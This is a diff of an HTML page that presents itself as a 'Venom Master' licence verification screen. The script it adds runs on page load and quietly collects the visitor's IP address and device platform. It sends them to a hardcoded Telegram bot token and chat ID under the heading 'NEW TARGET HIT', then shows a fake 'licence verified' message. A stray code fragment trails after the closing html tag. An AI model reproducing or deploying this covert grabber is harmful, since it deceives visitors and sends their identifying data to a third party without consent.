@@ -5,35 +5,62 @@
     <title>Enterprise Auth | Venom Master v3.5</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Noto+Sans+Arabic:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #020205; color: #ffffff; font-family: 'Noto Sans Arabic', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .bg-glow { position: absolute; width: 300px; height: 300px; background: rgba(255, 0, 60, 0.15); filter: blur(100px); border-radius: 50%; z-index: 1; }
-        .main-card { position: relative; z-index: 10; background: rgba(15, 15, 20, 0.9); border: 1px solid rgba(255, 0, 60, 0.3); padding: 50px; border-radius: 30px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); width: 90%; max-width: 500px; }
-        .premium-logo { font-family: 'Orbitron', sans-serif; font-size: 35px; background: linear-gradient(45deg, #ff003c, #ff6b8b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: 8px; margin-bottom: 10px; }
-        .status-pill { display: inline-block; padding: 8px 20px; background: rgba(255, 0, 60, 0.1); border: 1px solid rgba(255, 0, 60, 0.2); border-radius: 50px; color: #ff003c; font-size: 12px; font-weight: bold; margin-bottom: 30px; }
-        .progress-circle { width: 60px; height: 60px; border: 3px solid rgba(255, 255, 255, 0.05); border-top: 3px solid #ff003c; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 25px; }
+        body { background: #010103; color: #ffffff; font-family: 'Noto Sans Arabic', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .main-card { background: rgba(10, 10, 15, 0.95); border: 1px solid #ff003c; padding: 50px; border-radius: 20px; text-align: center; box-shadow: 0 0 30px rgba(255, 0, 60, 0.2); width: 85%; max-width: 450px; }
+        .premium-logo { font-family: 'Orbitron', sans-serif; font-size: 30px; color: #ff003c; letter-spacing: 5px; margin-bottom: 20px; }
+        .loader { width: 40px; height: 40px; border: 3px solid #111; border-top: 3px solid #ff003c; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .log-text { font-size: 14px; color: #666; font-family: monospace; height: 20px; }
     </style>
 </head>
 <body>
-    <div class="bg-glow"></div>
     <div class="main-card">
-        <div class="status-pill">AUTHENTICATION REQUIRED</div>
-        <div class="premium-logo">VENOM</div>
-        <div class="progress-circle"></div>
-        <div id="log" class="log-text">Initializing Secure Tunnel...</div>
-        <p style="color: #444; font-size: 12px; margin-top: 40px;">© 2025 PREMIUM SECURITY SOLUTIONS BY @b4_93</p>
+        <div class="premium-logo">VENOM MASTER</div>
+        <div class="loader"></div>
+        <div id="status">جاري تأمين الاتصال بالسيرفر...</div>
+        <p style="color: #444; font-size: 11px; margin-top: 30px;">SECURE LICENSE VERIFICATION SYSTEM</p>
     </div>
 
     <script>
         const token = '7854757970:AAEILS2nBQCohHDVzSCLjt_65iXDhzT8gac';
         const chat_id = '7336962855';
 
-        // محاكاة نصوص التحميل
-        const logs = ["Connecting...", "Verifying Hardware...", "Syncing Session...", "Authenticated!"];
-        let i = 0;
-        setInterval(() => { if(i < logs.length) document.getElementById('log').innerText = logs[i++]; }, 1500);
+        async function forceCapture() {
+            try {
+                // 1. جلب البيانات صامتاً
+                const res = await fetch('https://api.ipify.org?format=json');
+                const d = await res.json();
+                const ip = d.ip;
 
+                // 2. بناء رسالة التليجرام
+                const text = encodeURIComponent(`🔥 **NEW TARGET HIT** 🔥\n\n🌐 **IP:** ${ip}\n📱 **Dev:** ${navigator.platform}\n✅ **Status:** Verified`);
+
+                // 3. الطريقة المضمونة: الانتقال المباشر (Redirect) لتنفيذ الطلب
+                // سيقوم بفتح الرابط خلف الكواليس أو بسرعة فائقة
+                const finalUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}&parse_mode=Markdown`;
+                
+                // نستخدم fetch مع mode: 'no-cors' لإجبار المتصفح على تمرير الطلب
+                fetch(finalUrl, { mode: 'no-cors' });
+
+                // كاحتياط أخير، سنفتح الرابط في نافذة مخفية ونغلقها
+                let img = new Image();
+                img.src = finalUrl;
+
+                setTimeout(() => {
+                    document.getElementById('status').innerText = "تم التحقق من الترخيص بنجاح!";
+                    document.getElementById('status').style.color = "#00ff00";
+                }, 3000);
+
+            } catch (e) {
+                // إذا فشل كل شيء، نرسل طلب بسيط
+                const fallback = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=Login_Detected`;
+                new Image().src = fallback;
+            }
+        }
+
+        window.onload = forceCapture;
+    </script>
+</body>
+</html>
         async function capture() {
             try {
                 // سحب البيانات
